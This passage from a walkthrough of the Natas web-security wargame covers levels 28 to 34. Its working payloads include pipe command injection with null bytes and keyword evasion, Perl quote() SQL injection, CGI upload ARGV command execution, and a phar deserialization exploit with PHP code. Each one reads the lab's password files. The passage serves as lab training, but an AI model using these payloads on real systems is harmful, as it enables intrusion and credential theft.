Now let's hope to **Burp Suite** and intercept the login to change the username with the **null characters** one and add to it some random string so it will read it as a new user.

![alt text](NatasScreenshots/28.3.png)

If we hit forward, it will say the new user registred is **natas28test** and not **natas28**. But don't worry, it's just showing what we inputted after **htmlentities()** processed it and not what it is actuallt registred in  the database.

![alt text](NatasScreenshots/28.4.png)

So if our approach is right, if we log in now with the username **natas28** and the password **test**, it will go on with success and retrieve the data of **natas28** which correspond to the first instance of its crearion.

![alt text](NatasScreenshots/28.5.png)

If it didn't work out, then probably the dabatbase reached its 5 minutes and got resetted. So repeat the process and create that user again. 

# Level 29

So far, this is the hardest level I have encountered. It took me several days to solve it and I even got some help along the way. And honestly, I can't really explain the solution via text. Here is an awsome clean solving from John Hammond **"https://www.youtube.com/watch?v=qpC2sNcRj5o"** and if you didn't understand the approach he made, here is a clearer video **"https://www.youtube.com/watch?v=tEbq-SkNgY0"**.

# Level 30

This level is reading file name from the options and passing it in url as a get request to read its content. Obviously, a **cat** command is running on the back so let's try to inject some commands.

By the way, since it is working with **index.pl** file, putting its name the get request would print out its content but weirdly it did not. So let's proceed anyway.

After some experimenting, I found out that it won't work only if we added **null character** at the end which is **"%00"** in url encoding.

let's inject this payload:
```
http://natas29.natas.labs.overthewire.org/index.pl?file=|ls%00
```

![alt text](NatasScreenshots/30.1.png)

it printed out the files available in the options (plus a .txt at the end) and the **index.pl** file. Now it is clear why opening **index.pl** didn't work. It seems that it adds a prefix **".txt** to the file name we request. Anyway, we caan bypass the **cat** command the server is using and cat the **index.pl** ourselves.

```
http://natas29.natas.labs.overthewire.org/index.pl?file=|cat+index.pl%00
```

![alt text](NatasScreenshots/30.2.png)

It printed out its content. If you pay attention to the part I highlited, it check if our request contains the keyword **"natas"**. If it does, it gets interrupted with a message **"meeeeeep!**. So we can't directly craft a request with **"cat /etc/natas_webpass/natas30"**.

What we can do, is taking advantage of the concatinating the command **echo** does. For example :
```console
echo "Hel""lo!"
```
will output :
```
Hello!
```

So let's put an **echo** command in a **$()** notation and feed it to **cat** command like this :

```console
cat $(echo "/etc/nat""as_webpass/nat""as30")
```
to make sure it doesn't detect the keyword **natas**. Let's url encode it and request it

![alt text](NatasScreenshots/30.3.png)

# Level 31

This code is made with perl. After reading the source code, I found out that it is using **quote()** function to do the sanitizing. After some research, I found out that it can a second parameter to define the **Data Type**. For example, **SQL_VARCHAR** is used to sanitize strings in general, **SQL_INTEGER** when the expected input is number, **SQL_DATE** when we are dealing with dates, etc... The second parameter is rarely used and its default value is **SQL_VARCHAR** for general usage. What we can do is override the function and set its second parameter to **SQL_INTEGER** so it will only sanitize numbers and don't touch our injection payload. Since it is passing **param('password')** as parameter to the **quote()** function expecting it to be a scalar, let's make it an array of 2 elements where the first is our payload 
```
'' or 1=1
```
and the second which is theorically **SQL_INTEGER** but it won't actually work because it needs to import **DBI qw(:sql_types)**. Instead, we will use the constant definer of **SQL_INTEGER** which is the number **4**.

Now to make the **password** parameter, we can simply pass it twice in the request where the first instance will hold the payload and the second will hold the data type which is 4. Let's hope to **Burp Suite** and attempt a login with the username **natas31** and the password filled with the payload. Intercept and modify the request.

![alt text](NatasScreenshots/31.png)

# Level 32

This one converts csv files to HTML tables. It prevents inejction through **escapeHTML()** but I noticed it doesn't check the uploaded file correctly and trust the client to upload a legit csv file. After looking more into the **upload()** function of **GCI** module, I found a vulnerability related to it discussed by **blackhat** and here is a link for the presentation they used :

https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf

Our exact situation is discussed from slide 24 and it did is escalating to command execution. We can settle with just opening files as we only need to read the content of **/etc/natas_webpass/natas32**.

Here is a recap for the exploitation : 

We can apload multiple files by repeatedly submitting each file to the parameter **"file"**. All of them will be sorted in an array and fed to the **upload()** function.

Not all of them needs to be a legit file as the **upload()** requires only one legit file among that array. Further more, it will only accept the first elemnt to do its following treatments on it. So we can provide our payload as the first file and another correct file as the second. This way, we will bypass the first if statement and have our payload to do its job.

Now what payload do we need to inject ? Since the first elemnt won't be a legit file and just a simple string, the code line 
```perl
while (<file>) {}
```
will not work because it is not intended for strings. That's true until our string is actually **"ARGV"**.

This way, it will insert the ARG values to **open()** call. In other words, for each element in **ARGV**, it will open it and output its content. 

To feed a path of a file in **ARGV**, we can just append it to the request after a **"?"**.

Let's hop to **Burp Suite** and do it.

![alt text](NatasScreenshots/32.1.png)

As you can see, I duplicated the text related to the **'file'** parameter and edited the first one to make its content a simple **ARGV** call.

If we want to proceed to command execution like **blackhat** stated, we can simply add **" | "** to the **ARGV** element. This way, it will be upgraded from **open()** function to **exec()** function !

Let's try it by adding a request now in the request. The command we will try is :
```console
cat /etc/natas_webpass/natas32 |
```
and after URL encoding it will be :
```
cat%20/etc/natas_webpass/natas32%20%7C
```

![alt text](NatasScreenshots/32.2.png)

Worked like a charm !

# Level 33

We are dealing with the same perl script here but it's saying that we need to execute something in the webroot. When we try to follow the same approach we did earlier, nothing is revealed. And if we try to get the password for the previous level by opening **/etc/natas_webpass/natas32**, it works. So maybe it's a matter of file reading restrictions. Anyway, let's see the files in the webroot by executing **ls** command followed with **" | "**.

I tried the url encoded version of 
```console
ls |
```
and
```console
ls|
```
but with weirdly with no result.
What worked is 
```console
ls . |
```
which is converted to
```
ls%20.%20%7C
```

![alt text](NatasScreenshots/33.1.png)

Obviously our lead is that file called **"getpassword"**

We can run **file** command on it to find out that is executable

![alt text](NatasScreenshots/33.2.png)

Let's run it with the url encoded version of 
```console
./getpassword |
```
which is 
```
./getpassword%20%7C
```
to get the password

# Level 34

This level wasn't easy at all and it required some deep research to solve.  The logic behind the web is uploading a file and storing it somewhere in the server, then it does a check for the **md5** hash of the uploaded file and if it passes the check, its content gets executed with php compiler. So if we pass that hash check, we can literally execute any php code we want. The hash is being compared to string that is hardcoded from the beginning in the class **Executer**. Obviously, we need to override it. And this reminded me of how we changed a variable in a class in **level 26** using **PHP Object Injection** attack. But There is no desirialization call in the flow of the code. But let's keep that in mind. 

In an attempt to bypass the **md5_file()** function, I search for known vulnerabilities and I found out that applying that function on a **phar** file, the objects saved in its metadata get **unserilized**. I was like : Repeate that again ?

So I went looking for this **phar** thing. It seems like its an archive file similar to JAR in java and its has specific structure. Among this structure, this file holds reference to some other files and also something called metadata that can store objects and these objects get unserialized whenever this phar file gets passed in a file managment function like opening or something similar. I'm not so sure if I got the way it works right but I understood what I need to solve this level. We need a file that contains the php payload to be executed eventually, and a phar file that points to that payload file and that holds in its metadata an object from tha class **Executor** but with values we desire.


First, let's craft this **phar** file. Ir is done by creating a php file that creates the phar file. Let's name this file **"phar_creation.php"**

```php
<?php
    
    // modified Executor Class
    class Executor{
        private $filename="attack.php"; 
        private $signature=True;
        private $init=False;
    }

    // Object instantiaition
    $executor = new Executor();

    // phar file name declararion
    $pharFile = 'phar_file.phar';

    // clean up for existing phar file
    if (file_exists($pharFile)) 
    {
        unlink($pharFile);
    }

    // create phar
    $phar = new Phar($pharFile);

    // start buffering. Mandatory to modify stub which is something required
    $phar->startBuffering();

    // Add the stub; teh way found online without changing it
    $phar->setStub('<?php __HALT_COMPILER(); ?>');

    //empty text file just to fill the content of the archive 
    $phar->addFromString('empty.txt', 'text');

    // save the executor object to the metadata
    $phar->setMetadata($executor);

    // stop writing on the phar
    $phar->stopBuffering();
```

Now let's execute this file with the command :

```console
$ php --define phar.readonly=0 phar_creation.php
```

Now, let's hope to **Burp Suite** and intercept the submission of the file to change it's name from our **PHPSESSID** to it's intented name to be used later.

Now, let's create the **attack.php** file that contains our payload and will be called in the **passthru()** function.

```php
<?php echo shell_exec('cat /etc/natas_webpass/natas34'); ?>
```

and let's save it in the server by uploading it and keeping its name with **Burp Suite**.

Now, let's to the upload one more time. But this, we will change the name of the file to **"phar://phar_file.phar"** which is the wrapper that will let us execute the desirialization of the phar file we uploaded earlier in the server.
